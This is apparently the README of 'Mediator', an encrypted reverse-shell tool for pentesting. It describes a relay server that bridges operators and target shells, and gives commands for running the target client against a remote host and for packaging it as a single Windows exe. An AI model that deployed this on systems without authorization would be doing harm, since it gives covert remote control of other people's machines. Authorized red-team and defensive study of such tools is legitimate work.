<p align="center" float:"right">
    <img src="resources/mediator.png" alt="mediator logo"/>
</p>

Mediator is an end-to-end encrypted reverse shell in which the operator and the shell connect to a "mediator" server that bridges the connections. This removes the need for the operator/handler to set up port forwarding in order to listen for the connection. Mediator also allows you to create plugins to expand the functionality of the reverse shell.

You can run Mediator's scripts as standalone executables or you can import them for integration into other pentesting and incident response tools.

## Architecture:

Inspired by end-to-end encrypted chat applications, Mediator takes a unique approach to the client/server model of a reverse shell. Mediator uses:

1. A client reverse shell
2. A client handler/operator
3. A server that bridges the two connections

Reverse shells and handlers connect to the Mediator server with a connection key. The server listens on port 80 for handler connections and port 443 for reverse shell connections. When clients connect to the mediator, the server queues the clients according to their respective type and connection key. When both a reverse shell and an operator connect to the server with the same key, the server will bridge the two connections. From there, a key exchange is done between the two clients, and all communication between the reverse shell and operator is encrypted end-to-end. This ensures the server cannot snoop on the streams it is piping.

## Plugins

Plugins allow you to add extra commands that can execute code on the operator's host, the target host, or both! Please refer to the README in the plugins directory for more information about plugins.

## Instructions:

### Server

The client scripts can be run on Windows or Linux, but you'll need to stand up the server ([mediator.py](mediator.py)) on a Linux host. The server is pure Python, so no dependencies need to be installed. You can either run the server script with

```bash
$ python3 mediator.py
```

or you can build a Docker image with the provided [Dockerfile](Dockerfile) and run it in a container (make sure to publish ports 80 and 443).

### Clients

You will need to install the dependencies found in [requirements.txt](requirements.txt)) for the clients to work. You can do this with the following command:

```bash
$ pip3 install -r requirements.txt
```

See *Tips and Reminders* at the bottom for help on distributing the clients without worrying about dependencies.

The handler and the reverse shell can be used within other Python scripts or directly via the command line. In both cases, the clients can accept arguments for the server address and connection key. Usage of those arguments is described below.

**Mediator server address**

For *Python script* usage, the address of the mediator host is required upon instantiation:

*Handler class*
```python
from handler import Handler

operator = Handler(mediatorHost="example.com")
operator.run()
```

*WindowsRShell class*
```python
from windowsTarget import WindowsRShell

shell = WindowsRShell(mediatorHost="example.com")
shell.run()
```

If executing a client script *directly from a shell*, you can either hard code the address at the bottom of the script, or the server address can be specified as an argument with the `-s` or `--server` flag:

*handler.py*
```bash
$ python3 handler.py -s example.com
```

*windowsTarget.py*
```powershell
> python windowsTarget.py -s example.com
```

**Connection key**

When two handlers or two reverse shells connect to the mediator server with the same connection key, only the first connection is queued awaiting its match. Until the queued connection either times out (30 seconds) or matches with a counterpart connection, all other clients of the same type trying to connect with the same connection key will be dropped.

It is important to make sure each handler is using a unique connection key to avoid a race condition resulting in the wrong shell being given to an operator. 

Only keys with the prefix "#!ConnectionKey_" will be accepted by the server. The default connection key is "#!ConnectionKey\_CHANGE\_ME!!!".

To change the connection key for *Python script* usage, the connection key can optionally be supplied upon instantiation:

*Handler class*
```python
from handler import Handler

operator = Handler(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
operator.run()
```

*LinuxRShell class*
```python
from linuxTarget import LinuxRShell

shell = LinuxRShell(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
shell.run()
```

If executing a client script *directly from a shell*, you can either hard code the connection key at the bottom of the script, or the connection key can be specified as an argument with the `-c` or `--connection-key` flag:

*handler.py*
```bash
$ python3 handler.py -s example.com -c '#!ConnectionKey_secret_key'
```

*windowsTarget.py*
```powershell
> python windowsTarget.py -s example.com -c '#!ConnectionKey_secret_key'
```


## Tips and Reminders:

- REMINDER: handlers and reverse shells will not be bridged together unless they connect to the mediator server using the same connection key within 30 seconds of each other.
- TIP: You can easily create an exe for windowsTarget.py with pyinstaller using the `--onefile` flag
- TIP: For security, you should use a randomly generated connection key for each session. If a malicious party learns your connection key and spams the operator port with it, your operator client will be unable to connect due to the server not allowing duplicate connnections, and they will be connected to your target's shell.

